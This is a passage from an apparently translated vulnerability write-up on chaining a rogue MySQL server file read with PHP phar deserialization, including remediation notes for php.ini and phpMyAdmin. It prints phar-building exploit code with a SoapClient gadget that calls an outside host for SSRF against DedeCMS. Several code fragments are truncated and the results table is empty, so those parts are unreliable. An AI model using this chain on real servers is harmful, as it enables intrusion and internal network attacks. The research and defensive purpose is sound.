We can find that the reason steam wrapper can be supported is because we
called
    stream = php_stream_open_wrapper_ex(filename, "rb" ....);
We return to the load file local statement of mysql. In mysqli, mysql reads
files through php functions
    https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L43-L52
    if (PG(open_basedir)) {
            if (php_check_open_basedir_ex(filename, 0) == -1) {
                strcpy(info->error_msg, "open_basedir restriction in effect. Unable to open file");
                info->error_no = CR_UNKNOWN_ERROR;
                DBG_RETURN(1);
            }
        }
        info->filename = filename;
        info->fd = php_stream_open_wrapper_ex((char *)filename, "r", 0, NULL, context);
Which also called`php_stream_open_wrapper_ex`function. That is, we can also
trigger deserialization by reading a phar file.
### Recurrence
First we need to generate a phar
    pphar.php
    startBuffering();
    $phar->setStub("GIF89a ".""); //set stub
    $o = new A();
    $phar->setMetadata($o); //store meta-data in manifest
    $phar->addFromString("test.txt", "test"); //Add Add files to compress
    // Automatic signature calculation
    $phar->stopBuffering();
    ?>
Use this file to generate a phar.phar
Then we simulate a query
    test.php
    'http://example.com:5555', 'location'=>'http://example.com:5555/aaa'));
        public $dsql;
        function __construct(){
            $this->dsql = new SoapClient(null,array('uri'=>'http://xxxx:5555', 'location'=>'http://xxxx:5555/aaa'));
        }
        function __destruct() {
            unset($this->tpl);
            $this->dsql->Close(TRUE);
        }
    }
    @unlink("dedecms.phar");
    $phar = new Phar("dedecms.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a".""); //Set stub, add gif file header
    $o = new Control();
    $phar->setMetadata($o); //Save custom meta-data to manifest
    $phar->addFromString("test.txt", "test"); // Add files to be compressed
    // Automatic signature calculation
    $phar->stopBuffering();
    ?>
Then we can upload the avatar through the front end or using api from the back
end. And then rogue mysql server to read this file
    phar://./dedecms.phar/test.txt
Monitor 5555 can receive
ssrf can further attack surfaces such as redis.
## Part of CMS Test Results
name | impacted version | if mysql arbitrary file reading exists | if MySQL
server configuration controllable | controllable deserialization | upload phar
| patches  
---|---|---|---|---|---|---  
phpmyadmin | 
For different servers, this configuration has different methods. For JDBC,
this configuration is called `allowLoadLocalInfile`
  * 
In php's mysqli and mysql link modes, the underlying code directly determines
this configuration.
This configuration is `PHP_INI_SYSTEM`. In the php documentation, this
configuration means`Entry can be set in php.ini or httpd.conf`.
So it can only be fixed by modifying `mysqli.allow_local_infile = Off` in
php.ini.
In the php7.3.4 update, this configuration in mysqli has also been modified to
turn off by default.
Unfortunately, in the old version mysql5.6, which is no longer updated, both
mysql and mysqli are enabled by default.
In recent versions, you can configure this option before linking via
`mysqli_option` .
What is more interesting is that in this way, although `allow_local_infile` is
disabled, if you use wireshark to capture packets, you find
that`allow_local_infile` is still enabled (but invalid).
In the old version of phpmyadmin, `mysqli_real_connect` was executed first,
then`mysql_option` was set, so that `allow_local_infile` was actually
disabled, but`allow_local_infile` was not disabled when the link request was
initiated.
Actually, when `mysqli_real_connect` is executed, it will
initialize`allow_local_infile`. At the bottom of the PHP code,
`mysqli_real_connect` actually executes`mysqli_common_connect`. In the code of
`mysqli_common_connect`,`allow_local_infile` is set once.
If `mysql_option` is set before`mysqli_real_connect`, its `allow_local_infile`
configuration will be overwritten and its modification will be invalid.
phpmyadmin also fixed the vulnerability on January 22 by exchanging the
relative positions of the two functions.
# Summary
This is an attack mode against the mysql feature. At present, it cannot be
repaired at the mysql level. The impression can only be avoided if the
configuration is closed on the client. Although it is not very extensive as an
attack surface, it may be particularly effective in converting a normal
function into an arbitrary file for special situations, which is very
effective in expanding the attack surface.
The detailed attack situation is not assumed here, since the it could lead to
huge impact.
# References
  * 
  * 
  * 
  * 
* * *